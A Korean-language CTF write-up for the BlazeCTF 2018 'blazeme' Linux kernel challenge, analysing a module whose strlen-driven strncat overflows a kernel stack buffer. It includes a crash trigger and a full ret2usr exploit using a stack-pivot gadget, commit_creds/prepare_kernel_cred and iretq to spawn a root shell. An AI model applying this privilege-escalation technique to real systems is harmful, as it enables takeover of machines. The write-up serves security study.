---
layout: post
title: "blazeme - BlazeCTF 2018"
author: "nonetype"
categories: pwn
tags: "linux kernel exploit"
---

BOF를 통한 ret2usr kernel exploit

---

# 목차

1. TOC
{:toc}

---

대부분의 보호기법이 꺼져있는 환경에서 커널 익스플로잇 문제이다.
> [download](/assets/blazeme.tar.gz)

# Analysis
첨부파일 압축을 해제하면 `images/` 디렉터리 내에 다음과 같은 파일들이 존재한다.

```bash
nonetype@pwn:~/images$ ls
blazeme.c  bzImage  rootfs.ext2  run.sh
nonetype@pwn:~/images$
```

우선 run.sh 파일을 확인해보자.
```sh
#!/bin/sh
/usr/bin/qemu-system-x86_64 -kernel bzImage -smp 1 -hda rootfs.ext2 -boot c -m 64M -append "root=/dev/sda nokaslr rw ip=10.0.2.15:10.0.2.2:10.0.2.2 console=tty1 console=ttyAMA0" -net nic,model=ne2k_pci -net user -nographic
```

run.sh는 qemu를 통해 동일 디렉터리 내에 존재하는 `bzImage`를 `rootfs.ext2` 파일시스템으로 부팅해준다.

해당 스크립트를 실행시켜 qemu를 실행해보자.

```bash
nonetype@pwn:~/images$ sudo ./run.sh
WARNING: Image format was not specified for 'rootfs.ext2' and probing guessed raw.
         Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted.
         Specify the 'raw' format explicitly to remove the restrictions.
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]

Welcome to Buildroot
buildroot login:
```

id는 `blazeme`, pw는 `guest`이다.

```bash
buildroot login: blazeme
Password:
login: can't change directory to '/home/blazeme'
$ ls
bin         lib         lost+found  opt         run         tmp
dev         lib64       media       proc        sbin        usr
etc         linuxrc     mnt         root        sys         var
$
```

정상적으로 이미지가 실행된다
우선, `blazeme.c`를 확인하여 취약점을 어떤 방식으로 트리거링 할 수 있는지 알아보자.

```c
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kdev_t.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define DEVICE_NAME "blazeme"

#define ERR_BLAZEME_OK (1)
#define ERR_BLAZEME_MALLOC_FAIL (2)

#define KBUF_LEN (64)

dev_t dev = 0;
static struct cdev cdev;
static struct class *blazeme_class;

ssize_t blazeme_read(struct file *file, char __user *buf, size_t count,
								loff_t *ppos);
ssize_t blazeme_write(struct file *file, const char __user *buf,
		size_t count, loff_t *ppos);

int blazeme_open(struct inode *inode, struct file *file);
int blazeme_close(struct inode *inode, struct file *file);

char *kbuf;

struct file_operations blazeme_fops =
{
    .owner           = THIS_MODULE,
    .read            = blazeme_read,
    .write           = blazeme_write,
    .open            = blazeme_open,
    .release         = blazeme_close,
};

ssize_t blazeme_read(struct file *file, char __user *buf, size_t count,
								loff_t *ppos) {
	int len = count;
	ssize_t ret = ERR_BLAZEME_OK;

	if (len > KBUF_LEN || kbuf == NULL) {
		ret = ERR_BLAZEME_OK;
		goto out;
	}

	if (copy_to_user(buf, kbuf, len)) {
		goto out;
	}

	return (ssize_t)len;

out:
	return ret;
}

ssize_t blazeme_write(struct file *file,
						const char __user *buf,
						size_t count, loff_t *ppos) {
	char str[512] = "Hello ";
	ssize_t ret = ERR_BLAZEME_OK;

	if (buf == NULL) {
		printk(KERN_INFO "blazeme_write get a null ptr: buffer\n");
		ret = ERR_BLAZEME_OK;
		goto out;
	}

	if (count > KBUF_LEN) {
		printk(KERN_INFO "blazeme_wrtie invaild paramter count (%zu)\n", count);
		ret = ERR_BLAZEME_OK;
		goto out;
	}

	kbuf = NULL;
	kbuf = kmalloc(KBUF_LEN, GFP_KERNEL);
	if (kbuf == NULL) {
		printk(KERN_INFO "blazeme_write malloc fail\n");
		ret = ERR_BLAZEME_MALLOC_FAIL;
		goto out;
	}

	if (copy_from_user(kbuf, buf, count)) {
		kfree(kbuf);
		kbuf = NULL;
		goto out;
	}

	if (kbuf != NULL) {
		strncat(str, kbuf, strlen(kbuf));
		printk(KERN_INFO "%s", str);
	}

	return (ssize_t)count;

out:
	return ret;
}

int blazeme_open(struct inode *inode, struct file *file) {
	return 0;
}

int blazeme_close(struct inode *inode, struct file *file) {
	return 0;
}

int blazeme_init(void) {
	int ret = 0;

	ret = alloc_chrdev_region(&dev, 0, 1, DEVICE_NAME);
	if (ret) {
		printk("blazeme_init failed alloc: %d\n", ret);
		return ret;
	}

	memset(&cdev, 0, sizeof(struct cdev));

	cdev_init(&cdev, &blazeme_fops);
	cdev.owner = THIS_MODULE;
	cdev.ops = &blazeme_fops;

	ret = cdev_add(&cdev, dev, 1);
	if (ret) {
		printk("blazeme_init, cdev_add fail\n");
		return ret;
	}

	blazeme_class = class_create(THIS_MODULE, DEVICE_NAME);
	if (IS_ERR(blazeme_class)) {
		printk("blazeme_init, class create failed!\n");
		return ret;
	}

	dev = device_create(blazeme_class, NULL, dev, NULL, DEVICE_NAME);
	if (IS_ERR(&cdev)) {
		ret = PTR_ERR(&cdev);
		printk("blazeme_init device create failed\n");

		class_destroy(blazeme_class);
		cdev_del(&cdev);
		unregister_chrdev_region(&dev, 1);

		return ret;
	}

	return 0;
}

void blazeme_exit(void)
{
	cdev_del(&cdev);
	class_destroy(blazeme_class);
	unregister_chrdev_region(&dev, 1);
}

module_init(blazeme_init);
module_exit(blazeme_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("BLAZECTF 2018 crixer");
MODULE_DESCRIPTION("BLAZECTF CTF 2018 Challenge Kernel Module");
```

우선 눈에 띄는 부분은 `struct file_operations blazeme_fops` 부분이었다.
해당 구조체는 pwnable.kr syscall 문제를 풀어볼 때 공부했던 내용[^fops] [^fops_exploit]과 관련이 있어서 소스를 보자마자 `/dev/blazeme`를 open/read/write 할 시 구조체 내 포인터의 함수가 호출된다는 것을 알 수 있었다.

`/dev/blazeme`디바이스에 "TEST"라는 값을 쓰게 되면, `blazeme_write()`함수가 호출되어 모듈 내의 `kbuf` 버퍼에 `TEST`라는 값이 쓰이게 되고, `strncat(), printk()` 함수를 통해 kernel log에 `Hello TEST`라는 값이 최종적으로 출력될 것이다.


확인을 위해 `/dev/blazeme`에 "nonetype" 문자열을 넣고 dmesg 명령을 통해 커널 로그를 확인해보았다.
```sh
$ echo "nonetype" > /dev/blazeme
$ dmesg | tail -n 1
Hello nonetype
$
```

![expected](/assets/expected.jpg)

예상대로 `Hello nonetype`이 출력됬다.


# Slab Allocator

취약점을 찾기 위해서는 `SLAB Allocator`[^slab_allocator]를 이해해야 한다.
Slab Allocator는 동적 메모리 할당시 ptmalloc과는 다르게 힙 청크 내부에 메타데이터를 저장하지 않으며, 할당 해제시에 청크 첫 부분에 FP(Free Pointer)를 설정하여 Simple Linked List처럼 다음 Freed Chunk를 가르킨다.

간단하게 그림으로 표현하자면, 문자 A B C를 각각 64바이트씩 할당한다면 아래와 같은 모습으로 할당이 된다.

```
+0x00    +0x40    +0x80    +0xc0
v        v        v        v
+-------------------------------------------+
|        |        |        |                |
|        |        |        |                |
| A * 64 | B * 64 | C * 64 | More Chunks... |
|        |        |        |                |
|        |        |        |                |
+--------+--------+--------+----------------+
```

이 상태에서 A와 C 영역을 Free한다면 아래와 같은 모습이 될 것이다.

```
+0x00    +0x40    +0x80    +0xc0
v        v        v        v
+---+-----------------+---------------------+
|   |    |        |   |    |                |
| 0 |    |        | N |    |                |
| x | .. | B * 64 | U | .. | More Chunks... |
| 8 |    |        | L |    |                |
| 0 |    |        | L |    |                |
+---+----+--------+---+----+----------------+
```


# Finding Vulnerability

먼저 아래 그림을 다시 한번 살펴보자.
```
+0x00    +0x40    +0x80    +0xc0
v        v        v        v
+-------------------------------------------+
|        |        |        |                |
|        |        |        |                |
| A * 64 | B * 64 | C * 64 | More Chunks... |
|        |        |        |                |
|        |        |        |                |
+--------+--------+--------+----------------+
```

만약, 위와 같이 A B C 세 청크 모두 할당이 된 상태에서, `strlen(+0x00)`이 실행된다면 어떻게 될까?
`strlen()` 함수는 NULL 바이트까지의 길이를 세므로, 메타데이터와 NULL Byte가 없는 위와 같은 조건의 힙 영역에서는 `A의 길이 64 바이트`가 아닌 `A+B+C의 길이 192+@ 바이트`가 반환되게 된다.

이제 아래 코드를 확인해보자.

```c
kbuf = kmalloc(KBUF_LEN, GFP_KERNEL);
if (kbuf == NULL) {
	printk(KERN_INFO "blazeme_write malloc fail\n");
	ret = ERR_BLAZEME_MALLOC_FAIL;
	goto out;
}

if (copy_from_user(kbuf, buf, count)) {
	kfree(kbuf);
	kbuf = NULL;
	goto out;
}

if (kbuf != NULL) {
	strncat(str, kbuf, strlen(kbuf));
	printk(KERN_INFO "%s", str);
}
```
위 코드는 문제의 함수`blazeme_write()`이다.
함수 내에서 `kmalloc()`을 통해 동적 메모리를 할당하지만, `kfree()`가 호출되는 조건은 <b>'copy_from_user() 함수 호출시 복사되지 않은 바이트가 있을 경우'</b>[^copy_to_user]이다.
그러므로 정상적으로 값이 복사된 경우 `kfree()`가 호출되지 않아 청크들이 힙 영역에 계속 쌓이게 된다.

이후 `strncat()`을 호출할 때 길이 값으로 `strlen()` 함수를 호출하게 되는데, 위에서 말한대로 해제되지 않은 청크들이 나열되었을 때 `strlen()`이 호출된다면 NULL 바이트까지의 길이가 반환되므로 512바이트 길이의 배열 `str[512]`가 overflow되어 스택의 ret값을 덮게 된다.

간단한 코드를 짜서 확인해보자.

**ex.c**

```c
#include <fcntl.h>

int main() {

	char payload[64];
	for(int i=0; i<64; i++)
		payload[i] = 'A';

	int fd = open("/dev/blazeme", O_RDWR);
	while(1) {
		write(fd, payload, 64);
	}

	return 0;
}
```

compile


```sh
gcc -static -O2 -Wall ex.c -o ex
```

qemu 내에는 gcc가 설치되어 있지 않아서 filesystem을 mount한 후 넣어줬다.


```sh
root@pwn:~/images# ls
blazeme.c  bzImage  ex  ex.c  rootfs.ext2  run.sh  solve.c
root@pwn:~/images# mkdir mnt
root@pwn:~/images# mount -t ext2 rootfs.ext2 ./mnt
root@pwn:~/images# ls ./mnt
bin  dev  etc  lib  lib64  linuxrc  lost+found  media  mnt  opt  proc  root  run  sbin  sys  tmp  usr  var
root@pwn:~/images# cp ./ex ./mnt/
root@pwn:~/images# umount ./mnt
root@pwn:~/images#
```

qemu를 실행시켜 트리거링 코드를 실행시킨다.

```sh
root@pwn:~/images# ./run.sh
WARNING: Image format was not specified for 'rootfs.ext2' and probing guessed raw.
         Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted.
         Specify the 'raw' format explicitly to remove the restrictions.
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]

Welcome to Buildroot
buildroot login: blazeme
Password:
login: can't change directory to '/home/blazeme'
$ ls
bin         lib         media       root        tmp
dev         lib64       mnt         run         usr
etc         linuxrc     opt         sbin        var
ex          lost+found  proc        sys
$ ./ex
Segmentation fault
$
```

취약점이 트리거링되고, 세그폴트가 떴다.
`dmesg` 명령을 통해 커널 로그를 확인해보자!

```sh
$ dmesg
...
...
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@6�
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�6�
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�6�
...
...
BUG: stack guard page was hit at 00000000a8a5c2a5 (stack is 00000000dad4aef7..000000008ca3b93b)
kernel stack overflow (page fault): 0000 [#1] SMP NOPTI
Modules linked in: blazeme(O)
CPU: 0 PID: 98 Comm: ex Tainted: G           O     4.15.0 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
RIP: 0010:strncat+0x37/0x50
RSP: 0018:ffffc9000015fc30 EFLAGS: 00000206
RAX: ffffc9000015fc40 RBX: 0000000000000040 RCX: ffffc90000160001
RDX: ffffc90000161c86 RSI: ffff88000295437b RDI: ffffc9000015fc40
RBP: ffffc9000015fc30 R08: 0000000000000041 R09: 4141414141414141
R10: 4141414141414141 R11: 4141414141414141 R12: 00007ffeeccec270
R13: 00007ffeeccec270 R14: 0000000000000000 R15: ffffc9000015ff20
FS:  00000000006bd880(0000) GS:ffff880003c00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffc90000160000 CR3: 00000000029dc000 CR4: 00000000000006f0
Call Trace:
 blazeme_write+0x124/0x140 [blazeme]
Code: 80 3f 00 48 89 f9 74 09 48 83 c1 01 80 39 00 75 f7 48 01 ca eb 05 48 39 d1 74 18 48 83 c6 01 44 0f b6 46 ff 48 83 c1 01 45 84 c0 <44> 88 41 ff 75 e5 5d c3 c6 01 00 5d c3 66 90 66 2e 0f 1f 84 00
RIP: strncat+0x37/0x50 RSP: ffffc9000015fc30
---[ end trace 2c70b86c00933abe ]---
````

strncat 위치에서 kernel stack overflow가 떴다.


# Exploitation

Kernel Stack BOF를 통해 rip를 제어할 수 있게 되었으므로

## 추가중
<!-- kptr_restrict / dmesg_restrict -->

**Final Exploit Code**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

struct TrapFrame{
	void* rip;
	unsigned long user_cs;
	unsigned long user_rflags;
	void* rsp;
	unsigned long user_ss;
} __attribute__((packed));

void *(*prepare_kernel_cred)(void *);
int (*commit_creds)(void *);
struct TrapFrame tf;

// commit cred
static void lpe() {commit_creds(prepare_kernel_cred(0));}

// get shell
static void shell() {
	system("/bin/sh");
	exit(0);
}

static void save() {
	asm(
		"xor %rax, %rax;"
		"mov %cs, %ax;"
		"pushq %rax; popq tf+8;"
		"pushfq; popq tf+16;"
		"pushq %rsp; popq tf+24;"
		"mov %ss, %ax;"
		"pushq %rax; popq tf+32;"
	);
	tf.rip = &shell;
	tf.rsp = 0x5DFF0000;
}

static void restore() {
	asm(
		"movq $tf, %rsp;"
		"swapgs ;"
		"iretq;"
	);
}

static void root_shell() {
	lpe();
	restore();
}

int main() {
	commit_creds = (void*)0xFFFFFFFF81063960ull;
	prepare_kernel_cred = (void*)0xFFFFFFFF81063B50ull;
	save();
	// 0xffffffff814d2720: mov esp, 0x5DFFB7B0 ; ret  ;  (1 found)
	unsigned long *mem = mmap((void*)0x5DFF0000, 0x10000,
	PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
	mem[0xB7B0 / 8] = (unsigned long)root_shell;

	unsigned long gadget[8];
	for(int i=0;i<8; ++i)
	gadget[i] = 0xffffffff814d2720ull;

	char chunk[64];
	strncpy(chunk, "AA", 2);
	strncpy(&chunk[2], (const char *)gadget, 62);

	int fd = open("/dev/blazeme", O_RDWR);
	while(1) {
		write(fd, chunk, 64);
	}

	return 0;

}
```

## Result
```sh
Welcome to Buildroot
buildroot login: blazeme
Password:
login: can't change directory to '/home/blazeme'
$ ls
bin         lib64       mnt         run         tmp
dev         linuxrc     opt         sbin        usr
etc         lost+found  proc        solve       var
lib         media       root        sys
$ id
uid=1000(blazeme) gid=1000(blazeme) groups=1000(blazeme)
$ ./solve
$ id
uid=0(root) gid=0(root)
$
```


# References
[blazeme write-up] <https://devcraft.io/2018/04/25/blazeme-blaze-ctf-2018.html>

[kernel exploit(wikicon 발표자료)] <https://duasynt.com/slides/smep_bypass.pdf>

[인라인 어셈블리 기초] <https://wiki.kldp.org/KoreanDoc/html/EmbeddedKernel-KLDP/app3.basic.html>


[^fops]: <https://chardoc.tistory.com/8>
[^fops_exploit]: <https://procdiaru.tistory.com/82>
[^slab_allocator]: <http://jake.dothome.co.kr/slub/>
[^copy_to_user]: <https://blog.naver.com/PostView.nhn?blogId=ryutuna&logNo=100184443085&proxyReferer=https%3A%2F%2Fwww.google.com%2F>
